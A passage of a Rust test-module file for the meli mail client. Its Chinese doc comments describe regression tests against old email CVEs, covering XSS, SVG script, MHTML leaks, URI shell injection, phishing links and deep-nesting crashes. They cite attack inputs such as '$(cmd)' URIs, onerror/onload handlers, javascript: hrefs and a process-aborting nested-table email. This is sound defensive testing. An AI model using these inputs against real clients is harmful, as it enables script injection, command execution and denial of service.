///    lossy 解码后、`sanitize()` **之前**把超限输入截到 ≤ 上限的最大 UTF-8
///    字符边界，只对前缀 sanitize + render，再追加一行截断提示；截断在
///    sanitize 之前，故 sanitize 看到最终文档（未闭合 `<script>` 头吞掉余下
///    内容并被整体删除，无 parse differential），≤ 上限输入逐字节不变。
/// 2. **CWE-674 嵌套深度无界（比 100% CPU 更狠：进程 abort）**：html2text
///    0.17.1 用递归 `Drop` 胶水拆渲染树（gdb 实证 `RenderTable →
///    Vec<RenderTableRow> → RenderTableCell → Vec<RenderNode> → …` 链，
///    每表格嵌套层 ~700 B 栈），Rust 无法捕获栈溢出——过阈值即整个 meli
///    进程 abort。实测（默认 2 MiB tokio `spawn_blocking` view job 线程栈）：
///    `<table><tr><td>` 只开标签重复 5 000 次（**~75 KiB 邮件**）即崩，
///    2 000 层存活；字节上限约束输入大小而非嵌套深度，450 KiB 的深嵌套
///    邮件照样穿过 10 MiB 上限杀死进程。修复：新增
///    [`MAX_HTML_RENDER_NESTING_DEPTH`]（256 个字面开始标签深度），对
///    sanitize 后的规范化标记做引号感知扫描，在首个把深度推过上限的开始
///    标签处截断并追加第二条提示；256 比实测 abort 阈值（≥6 000 字面标签）
///    低 ≥23×，比合法邮件嵌套（生成器邮件 ≲30 层表格）高一个数量级。
///
/// 仓内孪生单测（`meli/src/mail/view/html_render.rs::tests`）：
/// `render_at_input_cap_has_no_truncation_notice`、
/// `render_over_input_cap_truncates_ascii_with_single_notice`、
/// `render_over_input_cap_cuts_on_cjk_char_boundary`、
/// `render_over_input_cap_with_invalid_utf8_does_not_panic`、
/// `render_truncation_cannot_smuggle_markup_past_sanitize`、
/// `render_deep_open_only_tables_do_not_abort`、
/// `render_nesting_depth_boundary_is_inclusive`、
/// `render_nesting_cap_ignores_void_elements_and_quoted_closers`、
/// `render_both_caps_compose_on_one_document`、
/// `render_over_cap_nested_tables_completes_within_watchdog`。
/// [`cve_1999_1016`] 以内嵌语料逐层锁定：L1 字面触发面免疫（8 MiB 级巨型
/// 字段死于 sanitize，sanitize / render 输出无表单标签 / `value=` 标记，
/// 且上限不误伤经典形态）；L2 资源面有界 + 崩溃面回归（深度上限内嵌套
/// 完成、**修复前 75 KiB 即 abort 进程**的只开标签深嵌套（5k / 30k /
/// ~699k 层）现在 `Ok` 返回且恰好一条深度提示、深度边界包含、void 元素与
/// 引号内假闭合不干扰计数、12 MiB 最坏形态 watchdog 内 `Ok` 且恰好一条
/// 字节提示无深度提示、双上限同击两条提示各一次）；L3 上限契约（恰好上限
/// 不截断、超限 CJK 字符边界截断、lossy + 上限组合、超限未闭合 script 无
/// 标记、提示纯文本、两个上限常量被引用并在移动时响亮失败）；L4 端到端
/// （base64 `text/html` 两封邮件——11 MiB 巨型最坏形态与 450 KiB 进程杀手
/// ——经 melib 解析、解码、render：有界、各恰好一条对应提示、无表单痕迹）。
/// 结论：一个字面触发面免疫 + 两个真实缺口（CWE-400 + CWE-674），均已随
/// 本回归修复，生产代码改动仅限 `meli/src/mail/view/html_render.rs`。
///
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`render`]: meli::mail::view::html_render::render
/// [`MAX_HTML_RENDER_INPUT_BYTES`]: meli::mail::view::html_render::MAX_HTML_RENDER_INPUT_BYTES
/// [`MAX_HTML_RENDER_NESTING_DEPTH`]: meli::mail::view::html_render::MAX_HTML_RENDER_NESTING_DEPTH
/// [`cve_1999_1016`]: self::cve_1999_1016
#[cfg(test)]
#[path = "CVE-1999-1016.rs"]
mod cve_1999_1016;

/// CVE-2007-4040（Outlook / Outlook Express，Windows；CVSS 8.8）URI 参数注入
/// regression（issue #65，表 3 of `SECURITY-CVE-RESEARCH.zh-CN.md` — 网页嵌入）：
/// 特定已注册 URI 携带 shell 元字符（`unknown:$(cmd)`、
/// `mailto:x?subject=;cmd`、含空格/引号的 URI）传入处理进程命令行，因客户端把
/// URI 拼进 shell 命令行而跨浏览器脚本 / 任意命令执行。meli 的「URI → 进程
/// 命令行」四个汇（`go_to_url` → `launch_url`、`List-Unsubscribe` URL、
/// `List-Archive`、相邻的 desktop-Exec `sh -c` 拼接）全部不经 shell 或带逐字符
/// 反斜杠 armor。[`cve_2007_4040`] 以内嵌 `multipart/alternative` 语料逐层锁
/// 定为**免疫证明，未发现缺口，无需改动生产代码**：scheme 确认门对元字符
/// corpus 的分类（unknown/`search-ms:`/无 scheme 必须确认，http/https/mailto
/// 任意大小写放行）、提取地图（无 `//` 的 `unknown:$(cmd)` 根本不提取、
/// `://` 拼写提取但落后于门、mailto 散文只产出落后于门的裸 email、白名单
/// scheme 的元字符 URL 直达 argv 契约层）、sanitize 只留白名单 href 且字节
/// 原样、`unsubscribe_action` 跳过未知 scheme 元字符选项并把白名单元字符
/// URL 逐字节带入 `OpenUrl`（有 mailto 时优先内部 `Send`）、畸形 mailto
/// fail-closed / 合法 mailto 的元字符只是惰性写信字段、以及
/// `desktop_exec_to_command` 的转义 armor。argv 单参数逐字节契约（`$(touch
/// marker)` 副作用预言机）由仓内孪生单测锁定在
/// `meli/src/mail/view/tests.rs`（`Context::new_mock` 为 `#[cfg(test)]`，
/// cve crate 无法驱动交互流）：`go_to_url_metacharacter_url_is_one_literal_argv_element`、
/// `go_to_url_unknown_scheme_metacharacters_need_confirmation_and_stay_literal`、
/// `list_archive_metacharacter_url_is_one_literal_argv_element`。
///
/// [`cve_2007_4040`]: self::cve_2007_4040
#[cfg(test)]
#[path = "CVE-2007-4040.rs"]
mod cve_2007_4040;

/// CVE-2007-2225（Outlook Express 5.5–6 / Windows Mail；MS07-034，NVD 未分配
/// CVSS 分数）MHTML 协议跨域信息泄露 regression（issue #66，表 3 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — 网页嵌入）：MHTML（`.mht`）协议处理器把
/// `mhtml:<URI>!<Content-Location>` 交给 IE 的 MHTML 解析器，该解析器对 UNC
/// 路径与 `Content-Disposition` 处理不当，允许构造的 MHTML URL 跨 IE 安全域
/// 读取本地 / 他域内容（CWE-200 类；同公告下 CVE-2007-2227 / CVE-2008-1448
/// 为同族）。meli 是终端客户端，没有 MHTML 协议处理器、没有 IE 安全域、没有
/// COM/URL moniker，字面的「`mhtml:` → IE 跨域读取」站点不存在；issue 指定的
/// 等价面是链接 scheme 白名单（`meli/src/mail/view/envelope.rs` 的
/// `is_default_launchable_scheme` / `url_scheme`，与
/// `meli/src/mail/view/html_render.rs` 的 `sanitize` ammonia `url_schemes`
/// 白名单），预期断言为白名单拒绝 `mhtml:`、其余仅纯文本显示。[`cve_2007_2225`]
/// 以内嵌 `multipart/alternative` 语料与 MHT 归档镜像语料逐层锁定为**免疫证明，
/// 未发现缺口，无需改动生产代码**：L1 语料是真实载体（melib 解析、双路负载
/// 逐字在场、`List-*` 头部逐字抵达）；L2 启动门对规范形态、跨域 `!` 定位、UNC、
/// 大小写、percent-编码、query、fragment 全拒、良性 `https`/`mailto` 全放；
/// L3 URL 模式提取从不保留 `mhtml:` 前缀（`file://` 余项落后于确认门、
/// `http://` 前缀剥离后是普通链接、裸 UNC/反斜杠主体不提取而只落到 `!` 后的
/// 普通 http(s) 尾巴，即「仅以纯文本显示」）；
/// L4 HTML 镜像的 `mhtml:` href 全部死于 sanitize、锚文本留为惰性散文；
/// L5 `unsubscribe_action` 跳过 `mhtml:` 选项落到合法 `https:`、`List-Archive`
/// 拒绝 `mhtml:`、`mailto:` 仍胜出为内部写信；L6 诚实载体每一层保持可用；
/// L7 内嵌 MHT 归档以 `Content-Disposition: attachment` 归类为惰性附件、不自动
/// 打开 / 执行，其 html 叶子经同一 sanitize 管道无 `mhtml:` 幸存。
///
/// [`cve_2007_2225`]: self::cve_2007_2225
#[cfg(test)]
#[path = "CVE-2007-2225.rs"]
mod cve_2007_2225;

/// CVE-2007-2227（Outlook Express 5.5–6 / Windows Mail；MS07-034，NVD 未分配
/// CVSS 分数）MHTML 协议跨域信息泄露 regression（issue #67，表 3 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — 网页嵌入）：与 CVE-2007-2225（issue #66）
/// 同属 MS07-034 家族（另见 CVE-2008-1448）。MHTML 协议处理器对 UNC 路径与
/// `Content-Disposition` 处理不当，跨 IE 安全域读取本地 / 他域内容；本 CVE 的
/// 攻击语料是 MHTML 文档内嵌的本地资源引用协议 `res:`（`res://…shdoclc.dll/
/// …htm` 指向系统 DLL 内嵌资源页）与 `mk:`（`mk:@MSITStore:…chm::/…htm` 经
/// HTML Help moniker 读取 `.chm`），以及时代同族 `its:` / `ms-its:`。meli 是
/// 终端客户端，没有 MHTML 协议处理器、没有 IE 安全域、没有 COM/URL moniker
/// （`res:`/`mk:` 依赖的 MSITStore），字面的「`mhtml:` → IE 跨域读取本地资源」
/// 站点不存在；issue 指定的等价面是链接 scheme 白名单
/// （`meli/src/mail/view/envelope.rs` 的 `is_default_launchable_scheme` /
/// `url_scheme`，与 `meli/src/mail/view/html_render.rs` 的 `sanitize` ammonia
/// `url_schemes` 白名单），预期断言为白名单拒绝 `res:`/`mk:` 等本地资源 scheme、
/// 其余仅纯文本显示。[`cve_2007_2227`] 以内嵌 `multipart/alternative` 语料与
/// 帮助文档镜像语料逐层锁定为**免疫证明，未发现缺口，无需改动生产代码**：L1
/// 语料是真实载体（melib 解析、双路负载逐字在场、`List-*` 头部逐字抵达）；
/// L2 启动门对 `res:`/`mk:`/`mhtml:`/`its:`/`ms-its:` 的规范形态、资源 ID 变体、
/// 大小写、percent-编码、query、fragment、复合变体全拒、裸 UNC 解析为无 scheme、
/// 良性 `https`/`http`/`mailto` 全放；L3 URL 模式提取只提取带 `://` 的
/// `res://…`（落后于确认门）、`mhtml:res://…` 剥前缀后与裸 `res://` 同类，
/// `mk:`/`its:`/`ms-its:`/裸 UNC 不提取而只落到 `mk:…http://` 的普通 http 余项，
/// 即「仅以纯文本显示」；L4 HTML 镜像的本地资源 href 全部死于 sanitize、锚文本
/// 留为惰性散文；L5 `unsubscribe_action` 跳过 `res:`/`mk:` 选项落到合法
/// `https:`、`List-Archive` 拒绝 `res:`、`mailto:` 仍胜出为内部写信；L6 诚实
/// 载体每一层保持可用；L7 内嵌帮助文档镜像与 base64 stub 以
/// `Content-Disposition: attachment` 归类为惰性附件、不自动打开 / 执行，其
/// html 叶子经同一 sanitize 管道无 `res:`/`mk:` 幸存，外联正文不含负载。
///
/// [`cve_2007_2227`]: self::cve_2007_2227
#[cfg(test)]
#[path = "CVE-2007-2227.rs"]
mod cve_2007_2227;

/// CVE-2008-1448（Outlook Express 5.5 SP2 / 6 SP1 与 Windows Mail；Microsoft
/// 公告 MS08-048，CVSS v2 7.1 HIGH AV:N/AC:M/Au:N/C:C/I:N/A:N，CWE-264，发布
/// 2008-08-12；aka "URL Parsing Cross-Domain Information Disclosure
/// Vulnerability"）MHTML 协议跨域信息泄露 regression（issue #68，表 3 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — 网页嵌入）：与 CVE-2007-2225（issue #66）、
/// CVE-2007-2227（issue #67）同属 MS07-034 / MS08-048 的 MHTML 跨域家族。MHTML
/// 协议处理器未给 UNC 共享路径分配正确的 IE 安全域，且未正确处理 MHTML URL
/// 重定向，远程攻击者借 `mhtml:` URI + 重定向绕过 IE 域限制读取任意文件；本
/// CVE 的特有向量是 UNC 安全域错配（`mhtml:file://\\host\share\…`）、MHTML URL
/// 重定向 + 构造 HTTP 头（`mhtml:http://…/redirect.mhtml!http://victim/…`）与
/// multipart 部件引用（`mhtml:http://x.example/a.html!cid`，`!` 后是
/// Content-Location / Content-ID 部件定位，配合 `Content-Disposition` 语义跨域
/// 读取）。meli 是终端客户端，没有 MHTML 协议处理器、没有 IE 安全域、没有
/// COM/URL moniker，字面的「`mhtml:` → IE 跨域读取」站点不存在；issue 指定的
/// 等价面是链接 scheme 白名单（`meli/src/mail/view/envelope.rs` 的
/// `is_default_launchable_scheme` / `url_scheme`，与
/// `meli/src/mail/view/html_render.rs` 的 `sanitize` ammonia `url_schemes`
/// 白名单 http/https/mailto），预期断言为白名单拒绝 `mhtml:` 的全部形态（含 `!`
/// 部件引用后缀）、无跨域读取通路、其余仅纯文本显示。[`cve_2008_1448`] 以内嵌
/// `multipart/alternative` 语料与「构造 multipart 部件引用」`.mht` 归档语料逐层
/// 锁定为**免疫证明，未发现缺口，无需改动生产代码**：L1 语料是真实载体（melib
/// 解析、双路负载逐字在场、`List-*` 头部逐字抵达）；L2 启动门对规范 `!cid` 部件
/// 引用、cid 值 / 他域部件变体、`!!` 双跳、UNC 错配、重定向、本地文件部件、
/// 大小写、percent-编码、query、fragment 全拒、裸 UNC 解析为无 scheme、良性
/// `https`/`http`/`mailto` 全放；L3 URL 模式提取从不保留 `mhtml:` 前缀
/// （`mhtml:http://…!cid` 剥前缀后是普通 `http://…!cid`、`!cid` 只是惰性路径
/// 字节，`mhtml:file://…` 余项落后于确认门、反斜杠主体 / 裸 UNC 不提取而只落到
/// `!` 后的普通 http(s) 尾巴）；L4 HTML 镜像的 `mhtml:` href 全部死于 sanitize，
/// `<meta http-equiv="refresh">` 重定向元素因不在 ammonia 标签白名单里整体死亡，
/// 锚文本留为惰性散文；L5 `unsubscribe_action` 跳过 `mhtml:` 选项落到合法
/// `https:`、`List-Archive` 拒绝 `mhtml:`、`mailto:` 仍胜出为内部写信；L6 诚实
/// 载体每一层保持可用；L7 内嵌 `.mht` 归档以 `Content-Disposition: attachment`
/// 归类为惰性附件、不自动打开 / 执行，其 html 叶经同一 sanitize 管道无 `mhtml:`
/// 幸存，Content-Location / Content-ID 头部字节永不流入链接面（对每个文本部件跑
/// URL 模式提取，没有任何链接值等于只存在于头部的受害者域 URL，证明无跨域读取
/// 通路），构造的 `Content-Disposition` 部件字节保持休眠附件。
///
/// [`cve_2008_1448`]: self::cve_2008_1448
#[cfg(test)]
#[path = "CVE-2008-1448.rs"]
mod cve_2008_1448;
/// CVE-2021-37746（Claws Mail < 3.18.0、Sylpheed ≤ 3.7.0；CVSS 6.1，NVD）链接
/// 校验不足 regression（issue #69，表 3 of `SECURITY-CVE-RESEARCH.zh-CN.md` —
/// 网页嵌入）：点击链接前的 URI 检查不充分，伪装链接（钓鱼）可达成本地资源。
/// issue 指定攻击样例三件套：伪装链接 `<a href="http://evil.example">
/// http://bank.example</a>`、Unicode 同形字符（西里尔 а U+0430）、U+202E 右向
/// 覆盖（RLO）。[`cve_2021_37746`] 以内嵌 `multipart/alternative` 语料逐层锁定
/// 为**免疫证明，未发现缺口，无需改动生产代码**：CVE 根因是「展示的链接文字」
/// 与「实际打开的 URI」分叉而点击前不校验；meli 链接面不存在这一分叉——可启动
/// 链接值永远是展示文本的逐字节子串（URL 模式 linkify 扫描对象就是 pager 显示
/// 的同一字符串，编号标记插在链接字节前），HTML 锚点的 href——唯一分叉点——被
/// html2text plain() 配置以编号脚注逐字节展示（防钓鱼可见性设计）。sanitize
/// 把伪装本地资源（file:）与 host 内 bidi 控制符（UTS #46/IDNA 拒绝）的 href
/// 整体杀死（伪装目标渲染前不可达），前缀 Cf 被 attribute trim 剥净，存活
/// href（同形字符 host、path 内 RLO——尾部 Cf 被 trim）逐字节可见可点；
/// mailto 脚注只产出裸 email 类链接；启动门按可见 scheme 分类（前缀 Cf、
/// file: 落逐 URL 确认门后）；诚实对照每层可用。展示字节恒等启动字节的 argv
/// 契约由仓内孪生单测 `go_to_url_disguised_lookalike_urls_are_one_literal_argv_element`
/// （`meli/src/mail/view/tests.rs`）锁定。meli 自身按逻辑序渲染、不做 bidi
/// 重排；双感知终端的视觉重排发生在 meli 之外，但展示与启动恒等——终端显示
/// 什么就启动什么。
///
/// [`cve_2021_37746`]: self::cve_2021_37746
#[cfg(test)]
#[path = "CVE-2021-37746.rs"]
mod cve_2021_37746;

/// CVE-2015-7609（Zimbra 网页邮箱；NVD 未分配 CVSS 分数；Fortinet 披露）邮件正文
/// XSS regression（issue #70，表 3 of `SECURITY-CVE-RESEARCH.zh-CN.md` — 网页嵌入 /
/// web/HTML embedding）：邮件内容未充分清洗即进入页面，攻击者在一封普通邮件里注入
/// 任意脚本——`<script>`（含 SVG/MathML 命名空间、未闭合吞尾、实体 / 大小写 / 属性
/// 混淆变体）、`<img src=x onerror=…>` 及 on* 全事件属性家族、`javascript:` URL
/// （href 载体与正文散文载体）。
///
/// meli 等价面映射（issue #70 明确要求）：meli 是终端邮件客户端，**没有 webmail
/// 功能面**——没有 HTTP 页面、会话 Cookie、浏览器 DOM 或 JavaScript 引擎。邮件
/// HTML 唯一的消费通路是邮件视图的显示管线 [`sanitize`]（ammonia 白名单：html5ever
/// 恰好一次解析 → 过滤树 → 带转义再序列化）→ [`render`]（html2text → 纯终端文本）：
/// `script`/`style` 属 ammonia `clean_content_tags` 默认集，连内容整体删除，
/// SVG/MathML 命名空间的 `script` 同样按本地名删除；`tag_attributes` 是整体替换，
/// 只保留 `a[href]`/`a[title]`，通用属性保持 ammonia 默认 `{lang,title}`，on*
/// 家族无处存活；`url_schemes` 只有 http/https/mailto，ammonia 对每个保留 href 用
/// WHATWG `Url::parse` 取 scheme（大小写归一、剥离 ASCII tab/LF/CR 与首尾 C0 /
/// 空格），meli 的 `attribute_filter` 在 trim 首尾 Cf / 控制符 / 空白后**重新校验**
/// href（CVE-2025-66376 硬化），前缀 Cf 隐藏的 `javascript:` 被整体丢弃而非被 trim
/// 激活；sanitize 输出再交给 html2text 降成终端文本，没有第二次“浏览器解析”可供
/// 碎片重组，也没有任何脚本 / 表单 / URL scheme 执行器。
///
/// [`cve_2015_7609`] 以内嵌 `multipart/alternative` 语料（plain + html 双叶）逐层
/// 锁定为**免疫证明，未发现缺口，无需改动生产代码**：L1 melib 解析出双叶且全部
/// 攻击字节逐字在场；L2 sanitize 输出无任何非白名单标签 / `on*` 属性 / 活的危险
/// scheme href 且为不动点；L3 render 里真实脚本体整体消失、事件属性值不出现、
/// 危险 scheme href 不生成脚注，正文散文 / 实体转义 / 注释切分留下的 `javascript:`
/// / `on*=` 只是惰性字面文本；L4 整封邮件端到端纯文本且诚实 `http`/`https`/`mailto`
/// 链接保持可用（sanitize 保留、render 脚注可见、`is_default_launchable_scheme`
/// 放行）。唯一记录性非对称点：`<noscript>` / 实体转义 / 双编码 / NUL 混淆标签名
/// 里的危险标记本来就不是脚本元素，render 解出的字面字符串不是活语义；
/// `java\u{200B}script:` 的内部 Cf 让 scheme 不成立（`url_scheme` 返回 `None`、
/// 确认门拒绝），最多作为惰性脚注展示。仓内孪生改动：无（免疫证明，未触碰生产代码）。
///
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`render`]: meli::mail::view::html_render::render
/// [`cve_2015_7609`]: self::cve_2015_7609
#[cfg(test)]
#[path = "CVE-2015-7609.rs"]
mod cve_2015_7609;

/// CVE-2008-2248（Outlook Web Access for Exchange Server 2003 SP2；CPE 还含
/// Exchange 2007 / 2007 SP1；Microsoft 公告 MS08-039，2008-07-08，CVSS v2 4.3
/// AV:N/AC:M/Au:N/C:N/I:P/A:N，CWE-79，BID 30078）OWA 网页邮箱邮件 HTML XSS
/// regression（issue #71，表 3 of `SECURITY-CVE-RESEARCH.zh-CN.md` — 网页嵌入 /
/// web/HTML embedding）：OWA 未充分清洗邮件 HTML 即把内容渲染进 webmail 浏览器
/// 页面，远程攻击者在一封普通邮件里注入任意 web 脚本 / HTML（NVD 原文 "via
/// unspecified HTML"），脚本在 OWA 源执行（会话 Cookie 窃取等）；同公告姊妹
/// 漏洞 CVE-2008-2247（via unspecified e-mail fields，BID 30130）是不同注入面。
///
/// meli 等价面映射（issue #71 明确要求）：meli 是终端邮件客户端，**没有 webmail
/// 功能面**——没有 HTTP 页面、会话 Cookie、浏览器 DOM 或 JavaScript 引擎。邮件
/// HTML 唯一的消费通路是邮件视图的显示管线 [`sanitize`]（ammonia 白名单：
/// html5ever 恰好一次解析 → 过滤树 → 带转义再序列化）→ [`render`]（html2text →
/// 纯终端文本）：`script`/`style` 属 `clean_content_tags` 连内容整体删除，
/// `iframe`/`object`/`embed`/`applet`/`frameset`/`bgsound`/`xml`/`isindex`/`form`/
/// `input`/`button`/`select`/`textarea`/`keygen`/`meta`/`base`/`link`/`video`/
/// `audio`/`source`/`track`/`details` 等非白名单元素连同 `src`/`data`/`action`/
/// `formaction`/`style`/`xlink:href`/`on*` 属性一起消失；`tag_attributes` 是整体
/// 替换（只留 `a[href]`/`a[title]`，通用属性 `{lang,title}`）；`url_schemes` 只有
/// http/https/mailto，ammonia 对每个保留 href 用 WHATWG `Url::parse` 取 scheme，
/// meli 的 `attribute_filter` 在 trim 首尾 Cf / 控制符 / 空白后**重新校验** href
/// （CVE-2025-66376 硬化）；sanitize 输出再交给 html2text 降成终端文本，没有
/// 第二次“浏览器解析”可供碎片重组，也没有任何脚本 / 表单 / CSS / URL scheme
/// 执行器。`<base href>` 重定基另由 MFSA-2005-11 的
/// `base_href_cannot_rebase_relative_urls` 锁定。
///
/// [`cve_2008_2248`] 以内嵌 `multipart/alternative` 语料（plain + html 双叶）逐层
/// 锁定为**免疫证明，未发现缺口，无需改动生产代码**。语料类别 A-J 与
/// CVE-2015-7609（issue #70，Zimbra；`cve/src/CVE-2015-7609.rs`）互补不重复：
/// A IE 嵌入 / 脚本宿主元素（iframe/object/embed/applet/frameset/frame/bgsound/
/// XML 数据岛/isindex/VML/条件注释）、B 导航 / meta 家族（refresh 到 javascript:、
/// UTF-7 charset 嗅探、base/link）、C 表单家族（action/formaction/autofocus
/// onfocus/onsubmit）、D CSS 脚本（白名单元素 style 属性 expression/-moz-binding/
/// behavior、style 元素 @import、未闭合吞尾）、E SVG/MathML 动画与属性注入
/// （animate/set/use/image/maction）、F HTML5 媒体 / autofocus 事件载体
/// （video/audio/source/track/details）、G scheme 混淆补（真实 LF/CR、`&Tab;`/
/// `&NewLine;`、无引号/单引号、等号前换行、斜杠分隔、`&#106;` 有/无分号）、
/// H RCDATA/raw-text（title/textarea/xmp/plaintext/listing）、I CDATA/PI/doctype、
/// J 惰性边界（scheme 内 NUL/全角、诚实 meta/base、相对/fragment）。分层：L1
/// melib 解析出双叶且全部攻击字节逐字在场（LF→CRLF 容忍）；L2 sanitize 输出无
/// 任何非白名单标签 / `on*` / 禁止属性 / 活的危险 scheme href 且为不动点；L3
/// render 里脚本 / 嵌入 / 表单元素整体消失、事件与 CSS 属性值不出现、危险 scheme
/// 不生成脚注，RCDATA / CDATA / 转义只解出惰性字面字符串，UTF-7 以字面 `+ADw-`
/// 字节交付，惰性边界的 `url_scheme` 为 `None` 且确认门拒绝；L4 整封攻击邮件
/// 端到端纯文本且诚实 `http`/`https`/`mailto` 链接保持可用（sanitize 保留、render
/// 脚注可见、`is_default_launchable_scheme` 放行）。实测记录：`&#106avascript:`
/// （无分号）与 `&#106;avascript:`（有分号）都被 html5ever 解码为 `javascript:`
/// 并被整体丢弃；`<![CDATA[<script>…` 在 HTML 上下文是覆盖到首个 `>` 的 bogus
/// comment，余下 `alert(1)]]>` 为惰性字面文本；`title`/`textarea`/`xmp`/`plaintext`
/// 内标记为惰性字面文本而 `listing` 是普通元素、内部真实 `<script>` 被整体删除；
/// scheme 内 NUL 被替换为 U+FFFD、全角 scheme 非 ASCII，两者最多作惰性脚注。
/// 仓内孪生改动：无（免疫证明，未触碰生产代码）。
///
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`render`]: meli::mail::view::html_render::render
/// [`cve_2008_2248`]: self::cve_2008_2248
#[cfg(test)]
#[path = "CVE-2008-2248.rs"]
mod cve_2008_2248;

/// CVE-2015-8864（Roundcube &lt; 1.0.9 / 1.1.x &lt; 1.1.5；NVD 未分配 CVSS 分数；
/// 同族 CVE-2016-4068）邮件内 SVG XSS regression（issue #72，表 3 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — 网页嵌入 / web/HTML embedding）：NVD 记录，
/// 攻击者在一封普通邮件里放入构造的 SVG 文档（正文内联或作为 `image/svg+xml`
/// 附件），Roundcube 未充分清洗即把邮件交给浏览器，SVG 命名空间里的脚本 / 事件
/// 属性 / 危险 URL 在 webmail 页面里执行；SVG 因自身命名空间与解析差异，是绕过
/// 「HTML 标签白名单」的经典载体。
///
/// meli 等价面映射（issue #72 明确要求）：meli 是终端邮件客户端，**没有 webmail
/// 功能面**——没有 HTTP 页面、会话 Cookie、浏览器 DOM、SVG 渲染器或 JavaScript
/// 引擎。邮件 HTML 唯一的消费通路是邮件视图的显示管线 [`sanitize`]（ammonia
/// 白名单：html5ever 恰好一次解析 → 过滤树 → 带转义再序列化）→ [`render`]
/// （html2text → 纯终端文本）：`script`/`style` 属 `clean_content_tags` 连内容
/// 整体删除，SVG foreign content 里的 `script` 仍按本地名命中；`svg`/
/// `foreignObject`/`animate`/`set`/`image`/`use`/`feImage` 等非白名单元素删除、
/// 仅保留再次清洗并转义的子文本；`tag_attributes` 是整体替换（只留
/// `a[href]`/`a[title]`，通用属性 `{lang,title}`），SVG 事件与动画属性无处存活；
/// `url_schemes` 只有 http/https/mailto，`xlink:href` / SVG `image href` / `use
/// href` / 动画 `values` 里的 `javascript:` 与 `data:image/svg+xml,…` 一并死亡，
/// meli 的 `attribute_filter` 在 trim 首尾 Cf / 控制符 / 空白后**重新校验** href
/// （CVE-2025-66376 硬化）；sanitize 输出再交给 html2text 降成终端文本，没有
/// 第二次“浏览器 / SVG 解析”可供碎片重组，也没有任何脚本 / URL scheme 执行器。
///
/// [`cve_2015_8864`] 以内嵌 `multipart/alternative` 语料（plain + html 双叶）与
/// 带 `image/svg+xml` 附件叶的 `multipart/mixed` 语料逐层锁定为**免疫证明，
/// 未发现缺口，无需改动生产代码**。语料与 CVE-2015-7609（issue #70，Zimbra）、
/// CVE-2008-2248（issue #71，OWA）互补不重复，SVG 专精深挖：a SVG 内 `script`
/// （issue 指定原形、大小写 / 属性 / 实体混淆、嵌套 SVG、`foreignObject`、
/// 未闭合吞尾）；b SVG 事件属性全家族（issue 指定 `<svg onload=…>` 原形与
/// `onbegin`/`onend`/`onrepeat`/`onactivate`/`onfocusin`/`onfocusout`/`onerror`/
/// `onanimation*`/`ontoggle` 等，挂 `<svg>` 根与 `<animate>`/`<set>`/`<image>`/
/// `<use>`/`<foreignObject>`/`<a xlink:href>` 载体）；c SVG 载体危险 URL
/// （`xlink:href="javascript:…"` 混淆、`<use xlink:href="data:image/svg+xml,…">`、
/// `<image href="javascript:…">`、动画 `values` 注入、HTML 锚点上的 SVG data
/// URL）；d SVG mXSS 近亲（`<svg><style>` 属性逃逸、SVG 内 CDATA、注释切分
/// `<s<!--c-->vg onload=…>`、`foreignObject` + `style`、`attributeName=onload`/
/// `xlink:href` 动画注入、`title` 突围）；e 实体转义 / 双编码文本与惰性 href
/// 边界。分层：L1 melib 解析出双叶 / 三叶且全部攻击字节逐字在场，`image/svg+xml`
/// 附件归类为 `ContentDisposition::Attachment` 惰性附件、其脚本字节绝不进入
/// HTML 显示管线；L2 sanitize 输出无任何非白名单 SVG 标签 / `xlink:href` /
/// `on*` / 禁止属性 / 活的危险 scheme href 且为不动点；L3 render 里真实 SVG
/// 脚本体整体消失、事件属性值不出现、危险 scheme 不生成脚注，SVG CDATA / 实体
/// 转义只解出惰性字面字符串（显式记录该非对称点），惰性边界的 `url_scheme` 为
/// `None` 且确认门拒绝；L4 整封攻击邮件端到端纯文本且诚实 `http`/`https`/`mailto`
/// 链接保持可用（sanitize 保留、render 脚注可见、`is_default_launchable_scheme`
/// 放行），`l4_webmail_script_pathway` 的注释记录全仓无 webmail / 浏览器 / SVG
/// 渲染器 / JS 引擎通路的映射依据。仓内孪生改动：无（免疫证明，未触碰生产代码）。
///
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`render`]: meli::mail::view::html_render::render
/// [`cve_2015_8864`]: self::cve_2015_8864
#[cfg(test)]
#[path = "CVE-2015-8864.rs"]
mod cve_2015_8864;

/// CVE-2016-4068（Roundcube &lt; 1.0.9 / 1.1.x &lt; 1.1.5；NVD 未分配 CVSS 分数；
/// 与 CVE-2015-8864 同族的两个漏洞之一）邮件内 SVG XSS regression（issue #73，
/// 表 3 of `SECURITY-CVE-RESEARCH.zh-CN.md` — 网页嵌入 / web/HTML embedding）：
/// NVD 记录，攻击者在一封普通邮件里放入构造的 SVG 文档（正文内联或作为
/// `image/svg+xml` 附件），Roundcube 未充分清洗即把邮件交给浏览器；issue #73
/// 指定的攻击面是同族变体——SVG 内 `<animate>`/`<set>` 修改 `href`，以及 SVG
/// `use` 外链等脚本注入形态。
///
/// meli 等价面映射（issue #73 明确要求）：meli 是终端邮件客户端，**没有 webmail
/// 功能面**——没有 HTTP 页面、会话 Cookie、浏览器 DOM、SVG 渲染器、JavaScript
/// 引擎，也没有 SMIL 动画引擎。邮件 HTML 唯一的消费通路是邮件视图的显示管线
/// [`sanitize`]（ammonia 白名单：html5ever 恰好一次解析 → 过滤树 → 带转义再
/// 序列化）→ [`render`]（html2text → 纯终端文本）：`animate`/`set`/
/// `animateTransform`/`animateMotion`/`discard`/`mpath`/`use` 都不在 24 项标签
/// 白名单里，且非白名单的 `<svg>` 被 ammonia 解包后其 SVG 命名空间子节点按
/// `check_expected_namespace` 连整棵子树（元素、文本与 `attributeName`/`values`/
/// `from`/`to`/`begin`/`dur`/`repeatCount`/`fill`/`xlink:href` 属性）一并删除；
/// 能保留 `href` 的只有 HTML 命名空间的 `<a>`，而 `tag_attributes` 整体替换只留
/// `href`/`title`，`href` 经 `url_schemes`（只有 http/https/mailto）与
/// `attribute_filter` trim 后重新校验（CVE-2025-66376 硬化）；`script`/`style`
/// 属 `clean_content_tags` 连内容整体删除；sanitize 输出再交给 html2text 降成
